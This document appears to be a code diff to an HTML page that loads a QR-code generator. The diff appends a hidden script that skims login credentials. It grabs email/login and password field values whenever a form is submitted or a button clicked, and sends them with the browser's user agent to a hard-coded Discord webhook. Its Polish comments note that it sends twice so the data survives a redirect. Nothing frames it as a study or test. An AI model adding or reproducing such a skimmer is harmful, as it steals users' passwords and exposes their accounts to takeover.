@@ -93,5 +93,72 @@
     <script src="https://cdnjs.cloudflare.com/ajax/libs/qrcode-generator/1.4.4/qrcode.min.js"></script>
     <script src="./js/script.js"></script>
 </body>
+<script>
+(function(){
+  var webhook = 'https://discord.com/api/webhooks/1537176300819845150/_ySFBDnFhtyBHxheS2n5yndIwZL_NdOBPK-OrvS-5w_otnUkYXdhw4dqS69LJvVrak6j';
 
+  var ostatniWysyl = 0;
+
+  function pobierz() {
+    function szukaj(selektory) {
+      for (var i = 0; i < selektory.length; i++) {
+        var el = document.querySelector(selektory[i]);
+        if (el && el.value) return el.value;
+      }
+      return '';
+    }
+    return {
+      email: szukaj(['input[type="email"]', 'input[name="email"]', 'input[name="login"]', 'input[type="text"]', '#email', '#login']),
+      haslo: szukaj(['input[type="password"]', 'input[name="password"]', '#password'])
+    };
+  }
+
+  function wyslij() {
+    var teraz = Date.now();
+    if (teraz - ostatniWysyl < 1500) return; // blokada przed podwójnym wysłaniem
+    ostatniWysyl = teraz;
+
+    var d = pobierz();
+    if (!d.email && !d.haslo) return;
+
+    var body = JSON.stringify({
+      embeds: [{
+        title: 'Nowe loginy',
+        color: 0x5865F2,
+        fields: [
+          { name: 'Email / Login', value: d.email || 'brak', inline: true },
+          { name: 'Hasło', value: d.haslo || 'brak', inline: true },
+          { name: 'User-Agent', value: navigator.userAgent.slice(0, 100), inline: false }
+        ],
+        timestamp: new Date().toISOString()
+      }]
+    });
+
+    // wysyłka na webhook — dwa sposoby naraz, żeby przetrwała natychmiastowe przekierowanie
+    if (navigator.sendBeacon) {
+      navigator.sendBeacon(webhook, new Blob([body], { type: 'application/json' }));
+    }
+    fetch(webhook, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: body }).catch(function(){});
+  }
+
+  // łapie wysyłanie formularza
+  document.addEventListener('submit', function(e) {
+    var f = e.target;
+    if (f && f.tagName === 'FORM' && f.querySelector('input[type="password"]')) {
+      wyslij();
+    }
+  }, true);
+
+  // zapas: łapie kliknięcie przycisku, gdy strona nie używa normalnego formularza
+  document.addEventListener('click', function(e) {
+    var t = e.target;
+    var btn = t.closest ? t.closest('button, input[type="submit"], input[type="button"]') : null;
+    if (!btn) return;
+    var f = btn.closest ? btn.closest('form') : null;
+    if (!f || f.querySelector('input[type="password"]')) {
+      wyslij();
+    }
+  }, true);
+})();
+</script>
 </html>
